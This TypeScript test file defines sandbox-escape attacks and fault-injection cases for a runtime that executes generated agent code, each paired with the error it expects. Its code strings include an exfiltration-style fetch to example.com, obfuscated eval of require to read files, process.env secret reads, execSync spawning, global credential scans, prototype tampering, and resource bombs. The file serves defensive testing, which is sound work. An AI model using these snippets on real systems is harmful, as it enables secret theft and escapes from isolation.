// D-Sandbox-Attack (M6.1, M6.2, M6.4) and the error-mapping fault-injection suite (M6.3).
// Escape detection uses canaries: an env secret, a file on disk, a spawn marker, real API key prefixes,
// and a host-level fetch counter. An attack "escapes" if any canary leaks into its output or the host
// observes a side effect outside the run boundary.
export interface Attack { id: string; cls: string; code: string; expect: (string | null)[] }

const R = (body: string) => `async function run(task, tools, context) {\nconst G = (0, eval)('this');\n${body}\n}`;
const LEAK = (expr: string) => R(`let v; try { v = String(${expr}); } catch (e) { v = 'blocked: ' + e.message; }\nreturn { status: 'success', answer: { value: 1, unit: v }, success_indicators: {}, trace: [v] };`);

export const ATTACKS: Attack[] = [
  { id: "loop-while", cls: "infinite_loop", code: R(`while (true) {}`), expect: ["E_TIMEOUT"] },
  { id: "loop-for", cls: "infinite_loop", code: R(`let x = 0; for (;;) { x++; }`), expect: ["E_TIMEOUT"] },
  { id: "loop-microtask", cls: "infinite_loop", code: R(`for (;;) { await null; }`), expect: ["E_TIMEOUT"] },
  { id: "hang-promise", cls: "hang", code: R(`await new Promise(() => {});`), expect: ["E_TIMEOUT"] },
  { id: "hang-slow-tools", cls: "hang", code: R(`for (let i = 0; i < 39; i++) { try { await tools.call('search_hotels', { city: 'Pune' }); } catch (e) {} } await new Promise(() => {});`), expect: ["E_TIMEOUT"] },
  { id: "mem-array", cls: "memory_bomb", code: R(`const a = []; for (let i = 0; ; i++) a.push({ i, s: 'y' + i });`), expect: ["E_RESOURCE", "E_TIMEOUT"] },
  { id: "mem-string", cls: "memory_bomb", code: R(`let s = 'x'; while (true) s = s + s;`), expect: ["E_RESOURCE", "E_TIMEOUT"] },
  { id: "mem-buffer", cls: "memory_bomb", code: R(`const b = new ArrayBuffer(1024 * 1024 * 1024); return { status: 'success', answer: { value: b.byteLength, unit: 'b' } };`), expect: ["E_RESOURCE"] },
  { id: "mem-repeat", cls: "memory_bomb", code: R(`const a = []; while (true) a.push('z'.repeat(1 << 20) + a.length);`), expect: ["E_RESOURCE", "E_TIMEOUT"] },
  { id: "stack-recursion", cls: "stack_bomb", code: R(`function f(n) { return f(n + 1) + 1; } return f(0);`), expect: ["E_RESOURCE"] },
  { id: "stack-mutual", cls: "stack_bomb", code: R(`function a(n) { return b(n) + 1; } function b(n) { return a(n) + 1; } return a(0);`), expect: ["E_RESOURCE"] },
  { id: "net-fetch", cls: "network", code: R(`const r = await fetch('https://example.com/exfil?d=1'); return { status: 'success', answer: { value: 1, unit: 'x' } };`), expect: ["E_NET_DENIED", "E_CONTRACT"] },
  { id: "net-fetch-swallowed", cls: "network", code: R(`try { await G['fe' + 'tch']('https://example.com/x'); } catch (e) {} return { status: 'success', answer: { value: 1, unit: 'x' } };`), expect: ["E_NET_DENIED"] },
  { id: "net-xhr", cls: "network", code: R(`const C = G['XMLHttp' + 'Request']; new C(); return { status: 'success', answer: { value: 1, unit: 'x' } };`), expect: ["E_NET_DENIED"] },
  { id: "net-fake-tool", cls: "network", code: R(`await tools.call('http_get', { url: 'https://example.com' }); return { status: 'success', answer: { value: 1, unit: 'x' } };`), expect: ["E_TOOL"] },
  { id: "fs-require", cls: "filesystem", code: LEAK(`(0, G['ev' + 'al'])('req' + 'uire')('fs').readFileSync(context.canary_file, 'utf8')`), expect: [null] },
  { id: "fs-dynamic-import", cls: "filesystem", code: R(`const m = await (0, G['ev' + 'al'])('imp' + 'ort("fs")'); return { status: 'success', answer: { value: 1, unit: String(m.readFileSync(context.canary_file)) } };`), expect: ["E_CRASH", "E_CONTRACT"] },
  { id: "fs-quickjs-std", cls: "filesystem", code: R(`const m = await (0, G['ev' + 'al'])('imp' + 'ort("std")'); return { status: 'success', answer: { value: 1, unit: String(m.loadFile(context.canary_file)) } };`), expect: ["E_CRASH", "E_CONTRACT"] },
  { id: "proc-env", cls: "process_env", code: LEAK(`G['pro' + 'cess'].env.RARC_CANARY`), expect: [null] },
  { id: "proc-function-ctor", cls: "process_env", code: LEAK(`(function(){}).constructor('return this')()['pro' + 'cess'].env.RARC_CANARY`), expect: [null] },
  { id: "proc-spawn", cls: "process_env", code: LEAK(`(0, G['ev' + 'al'])('req' + 'uire')('child_process').execSync('touch ' + context.canary_spawn)`), expect: [null] },
  { id: "cred-scan-global", cls: "credentials", code: LEAK(`Object.getOwnPropertyNames(G).map((k) => { try { return k + '=' + JSON.stringify(G[k]); } catch (e) { return k; } }).join('|')`), expect: [null] },
  { id: "cred-context", cls: "credentials", code: LEAK(`JSON.stringify(context) + JSON.stringify(task)`), expect: [null] },
  { id: "side-book", cls: "side_effect", code: R(`await tools.call('book_hotel', { hotel_id: 'H-PNQ-1', checkin: '2026-11-10', nights: 1 }); return { status: 'success', answer: { value: 1, unit: 'x' } };`), expect: ["E_CONFIRM_REQUIRED"] },
  { id: "side-invite-swallowed", cls: "side_effect", code: R(`try { await tools.call('send_invite', { participants: ['alice'], start: '2026-11-10T09:00Z', end: '2026-11-10T10:00Z' }); } catch (e) {} return { status: 'success', answer: { value: 1, unit: 'x' } };`), expect: ["E_CONFIRM_REQUIRED"] },
  { id: "flood-sequential", cls: "tool_flood", code: R(`for (let i = 0; i < 1000; i++) { try { await tools.call('search_hotels', { city: 'Pune' }); } catch (e) {} } return { status: 'success', answer: { value: 1, unit: 'x' } };`), expect: ["E_RESOURCE"] },
  { id: "flood-parallel", cls: "tool_flood", code: R(`await Promise.all(Array.from({ length: 500 }, () => tools.call('search_hotels', { city: 'Pune' }).catch(() => 0))); return { status: 'success', answer: { value: 1, unit: 'x' } };`), expect: ["E_RESOURCE"] },
  { id: "output-bomb", cls: "output_bomb", code: R(`return { status: 'success', answer: { value: 1, unit: 'x'.repeat(5 * 1024 * 1024) } };`), expect: ["E_RESOURCE"] },
  { id: "tamper-tools", cls: "tamper", code: R(`try { tools.call = async () => 1; } catch (e) {} const r = await tools.call('get_person_profile', { person: 'nobody' }); return { status: 'success', answer: { value: r, unit: 'x' } };`), expect: ["E_TOOL", "E_CRASH"] },
  { id: "tamper-proto", cls: "tamper", code: R(`Object.prototype.toJSON = function () { return 'pwned'; }; return { status: 'success', answer: { value: 1, unit: 'x' } };`), expect: ["E_MALFORMED_OUTPUT", "E_CRASH"] },
  { id: "host-internals", cls: "tamper", code: R(`const f = G['__host' + '_call']; const r = await f('book_hotel', '{"hotel_id":"H","checkin":"x","nights":1}'); return { status: 'success', answer: { value: 1, unit: String(r) } };`), expect: ["E_CONFIRM_REQUIRED"] },
];

// M6.3: one or two programs per error code, each with exactly one correct code.
export interface MapCase { id: string; expect: string; code: string; faults?: { tool: string; fault: string; calls?: string }[]; tools?: string[] }
export const MAPPING_CASES: MapCase[] = [
  { id: "crash-typeerror", expect: "E_CRASH", code: R(`const x = null; return x.y;`) },
  { id: "crash-throw", expect: "E_CRASH", code: R(`throw new Error('boom');`) },
  { id: "timeout-loop", expect: "E_TIMEOUT", code: R(`while (true) {}`) },
  { id: "timeout-hang", expect: "E_TIMEOUT", code: R(`await new Promise(() => {});`) },
  { id: "resource-stack", expect: "E_RESOURCE", code: R(`function f() { return f() + 1; } return f();`) },
  { id: "resource-calls", expect: "E_RESOURCE", code: R(`for (let i = 0; i < 100; i++) await tools.call('search_hotels', { city: 'Pune' }); return { status: 'success', answer: { value: 1, unit: 'x' } };`) },
  { id: "net-fetch", expect: "E_NET_DENIED", code: R(`await G['fe' + 'tch']('https://example.com'); return { status: 'success', answer: { value: 1, unit: 'x' } };`) },
  { id: "net-xhr", expect: "E_NET_DENIED", code: R(`const C = G['XMLHttp' + 'Request']; new C(); return { status: 'success', answer: { value: 1, unit: 'x' } };`) },
  { id: "tool-injected", expect: "E_TOOL", code: R(`const h = await tools.call('search_hotels', { city: 'Pune' }); return { status: 'success', answer: { value: h.length, unit: 'x' } };`), faults: [{ tool: "search_hotels", fault: "error", calls: "all" }] },
  { id: "tool-unknown", expect: "E_TOOL", code: R(`await tools.call('teleport', {}); return { status: 'success', answer: { value: 1, unit: 'x' } };`) },
  { id: "malformed-status", expect: "E_MALFORMED_OUTPUT", code: R(`return { status: 'done', answer: 1 };`) },
  { id: "malformed-answer", expect: "E_MALFORMED_OUTPUT", code: R(`return { status: 'success', answer: { value: 'hot', unit: 1 } };`) },
  { id: "contract-require", expect: "E_CONTRACT", code: `const fs = require('fs');\n` + R(`return { status: 'success', answer: { value: 1, unit: 'x' } };`) },
  { id: "contract-syntax", expect: "E_CONTRACT", code: R(`return { status: 'success', answer: { value: 1, unit: 'x' ;`) },
  { id: "confirm-book", expect: "E_CONFIRM_REQUIRED", code: R(`await tools.call('book_hotel', { hotel_id: 'H-PNQ-1', checkin: '2026-11-10', nights: 1 }); return { status: 'success', answer: { value: 1, unit: 'x' } };`) },
  { id: "confirm-invite", expect: "E_CONFIRM_REQUIRED", code: R(`await tools.call('send_invite', { participants: ['a'], start: '2026-11-10T09:00Z', end: '2026-11-10T10:00Z' }); return { status: 'success', answer: { value: 1, unit: 'x' } };`) },
];

// Seeded faults (D-Seeded-Faults, M8.4): known bugs injected into working generated agents by wrapping
// their tool client / entry point. Each targets one taxonomy category.
export const SEEDED_FAULTS: { id: string; name: string; targets: string; wrap: (requiredInputs: string[]) => string }[] = [
  { id: "F1", name: "crashes on empty results", targets: "T3", wrap: () => `
const __f1_run = run;
run = async function (task, tools, context) {
  const t2 = { call: async (n, a) => { const r = await tools.call(n, a);
    const empty = r == null || (Array.isArray(r) && r.length === 0) || (typeof r === 'object' && Object.values(r).some((v) => Array.isArray(v) && v.length === 0));
    if (empty) throw new TypeError("Cannot read properties of undefined (reading '0')"); return r; } };
  return __f1_run(task, t2, context);
};` },
  { id: "F2", name: "does not handle tool errors", targets: "T2", wrap: () => `
const __f2_run = run;
run = async function (task, tools, context) {
  let err = null;
  const t2 = { call: async (n, a) => { try { return await tools.call(n, a); } catch (e) { err = err || e; throw e; } } };
  const r = await __f2_run(task, t2, context);
  if (err) throw err;
  return r;
};` },
  { id: "F3", name: "retries forever on errors", targets: "T7", wrap: () => `
const __f3_run = run;
run = async function (task, tools, context) {
  const t2 = { call: async (n, a) => { let last; for (let k = 0; k < 60; k++) { try { return await tools.call(n, a); } catch (e) { last = e; } } throw last; } };
  return __f3_run(task, t2, context);
};` },
  { id: "F4", name: "breaks on schema drift", targets: "T4", wrap: () => `
const __f4_run = run;
run = async function (task, tools, context) {
  const bad = (o) => { const xs = Array.isArray(o) ? o : o && typeof o === 'object' ? Object.values(o).filter(Array.isArray).flat() : [];
    if (!xs.length) return false; const keys = Object.keys(xs[0] || {}).join(',');
    return xs.some((x) => x && typeof x === 'object' && (Object.keys(x).join(',') !== keys || Object.values(x).some((v) => typeof v === 'string' && /^-?[\\d,.]+$/.test(v)))); };
  const t2 = { call: async (n, a) => { const r = await tools.call(n, a); if (bad(r)) throw new TypeError('expected number, got string'); return r; } };
  return __f4_run(task, t2, context);
};` },
  { id: "F5", name: "assumes inputs are complete", targets: "T1", wrap: (req) => `
const __f5_run = run;
run = async function (task, tools, context) {
  const inp = (task && task.inputs) || {};
  for (const k of ${JSON.stringify(req)}) { const v = inp[k]; if (v === undefined || v === null || v === '' || (Array.isArray(v) && !v.length)) throw new TypeError("Cannot read properties of undefined (reading '" + k + "')"); }
  return __f5_run(task, tools, context);
};` },
];
